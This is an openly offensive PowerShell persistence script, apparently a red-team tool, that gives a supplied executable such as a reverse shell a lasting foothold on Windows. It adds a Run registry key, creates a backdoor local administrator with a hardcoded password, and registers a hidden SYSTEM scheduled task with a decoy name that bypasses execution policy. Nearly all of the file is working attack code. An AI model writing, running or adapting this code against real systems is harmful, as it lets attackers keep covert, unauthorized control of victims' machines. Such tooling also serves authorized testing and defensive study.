<#
.SYNOPSIS
    .This is a powershell script that provides basic persistence capabilities through different channels.
.DESCRIPTION
    .This is a powershell script that provides basic persistence capabilities through different channels. Make sure you run as admin
.EXAMPLE
    C:\PS> 
    .\Persistence -Addmin
    .\Persistence -RegKey "C:\temp\reverse_shell.exe"
    .\Persistence -TaskPWn "C:\temp\reverse_shell.exe"

.NOTES

#>

param (
    
    [string]$file, #If you already have a reverse payload build, a la MSFVenom or equivalent, use the path of the .exe with this flag
	
    #[switch]$help = "To run this script, use ./persistence.ps1 -args. For more information, run Get-Help .\Persistence.ps1"
    [switch]$RegKey, #adds a reverse shell using REgKey. I hope to expand this in the future with multiple types of regkeys
    [switch]$Addmin, #adds an admin user named dispareo with the password of dispareo
    [switch]$TaskPwn, #Adds persistence via task scheduler using the .exe (or really, any file) of your choice
    [switch]$AllThePwns #All of the above persistence pwns
)


#First, let's make sure you're authorized to run this. If not, elevate further
$CurrentWindowsIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
$CurrentWindowsPrincipal = New-Object System.Security.Principal.WindowsPrincipal($CurrentWindowsIdentity)
#This should return true if specific user is Admin
if ($CurrentWindowsPrincipal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "Ok, cool, looks like you're running as administrator" 
} else {
    Write-Warning "[!] This is awkard, but you don't have permission. Run again as an administrator or keep elevating until you can."
    exit 1
}


# Function to do registry persistence stuff
function RegKey {
    param ([Parameter(Mandatory)]$file,
    [switch]$RegKey)
   
    Write-Host "Trying to write the "bring your own executable" to the registry Key"
    $regKeyPath = "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"
    reg add $regKeyPath /v Dispareos_Persistence /t REG_SZ /d "$file"
    Write-Host "[!][!] Persistent Reg key added! Your executable now will run every time the PC reboots"
}

# Function to handle Admin privileges
function Addmin {
    Write-Host "Adding the admin user "Dispareo").`n[*] The user name will be "dispareo" and the password will also be (surprise!~) "DispareoSecurity" .`nok, but did anyone appreciate the Dad joke using the "addmin" parameter? Just know there are plenty more when "
    try {
        New-LocalUser -Name 'Dispareo' -Description 'Definitely a valid admin account' -Password (ConvertTo-SecureString "DispareoSecurity" -AsPlainText -Force)
        Add-LocalGroupMember -Group "Administrators" -Member "Dispareo"

    }
    catch {
        Write-Warning "[!] Not sure what happened here, but this didn't work fro some reason."
    }
}

function TaskPwn {
    param ([Parameter(Mandatory)]$file,
    [switch]$TaskPwn)
       
    Write-Host "Writing task for some persistence action."
    Write-Host "The filename is $file" -ForegroundColor green
    $trigger = New-ScheduledTaskTrigger -Weekly -DaysOfWeek Monday -At 3am
    $action= New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-ExecutionPolicy Bypass -NonInteractive -WindowStyle Hidden -File $file"
    $User= "NT AUTHORITY\SYSTEM"
    Register-ScheduledTask -TaskName 'Cleanup or something' -User $User -Action $action -Trigger $trigger
}


switch ($true) {
    # If registry key is provided, do regiustry stuff
    ($RegKey) { RegKey; break }

    # If Addmin flag is set, Add the admin (Addmin :)
    ($Addmin) { Addmin; break }

    # If TaskPwn flag is set, create sch task
    ($TaskPwn) { TaskPwn; break }

    # If TaskPwn flag is set, create sch task
    ($AllThePwns) { RegKey; Addmin; TaskPwn; break }
}
